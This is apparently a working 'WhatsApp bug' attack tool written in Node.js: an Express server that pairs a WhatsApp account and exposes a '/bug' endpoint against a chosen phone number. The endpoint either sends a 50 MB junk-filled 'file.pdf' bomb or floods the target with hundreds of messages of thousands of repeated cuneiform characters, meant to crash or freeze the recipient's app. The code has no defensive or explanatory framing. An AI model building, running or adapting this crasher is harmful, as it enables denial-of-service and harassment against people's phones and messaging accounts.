const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys')
const express = require('express')
const app = express()
app.use(express.json())
app.use(express.static('public'))
let sock = null, connected = false, pairingCode = null
async function connectWA(phone) {
  const { state, saveCreds } = await useMultiFileAuthState('auth')
  sock = makeWASocket({ auth: state, printQRInTerminal: false })
  sock.ev.on('creds.update', saveCreds)
  if (!sock.authState.creds.registered && phone) {
    await new Promise(r => setTimeout(r, 2000))
    const code = await sock.requestPairingCode(phone)
    pairingCode = code
    console.log('[CODE]', code)
  }
  sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
    if (connection === 'open') { connected = true; pairingCode = null; console.log('[+] Connected') }
    if (connection === 'close') {
      connected = false
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) connectWA(null)
    }
  })
}
app.get('/status', (req, res) => res.json({ connected, pairingCode }))
app.post('/pair', async (req, res) => {
  const { phone } = req.body
  if (!phone) return res.json({ error: 'No phone' })
  pairingCode = null; connected = false
  await connectWA(phone.replace(/[^0-9]/g,''))
  await new Promise(r => setTimeout(r, 5000))
  res.json({ code: pairingCode || 'Tunggu...' })
})
app.post('/bug', async (req, res) => {
  const { target, count, type } = req.body
  if (!connected) return res.json({ error: 'Belum connected' })
  const jid = target.replace(/[^0-9]/g,'') + '@s.whatsapp.net'
  if (type === 'filebomb') {
    const buf = Buffer.alloc(50*1024*1024, 0xff)
    try { await sock.sendMessage(jid, { document: buf, mimetype: 'application/pdf', fileName: 'file.pdf' }); return res.json({ status: 'Sent' }) }
    catch(e) { return res.json({ error: e.message }) }
  }
  let sent = 0
  for (let i = 0; i < (count||200); i++) {
    try { await sock.sendMessage(jid, { text: '𒐫'.repeat(5000) }); sent++ } catch(e) {}
  }
  res.json({ sent })
})
connectWA(null)
app.listen(3000, () => console.log('[+] Running on port 3000'))
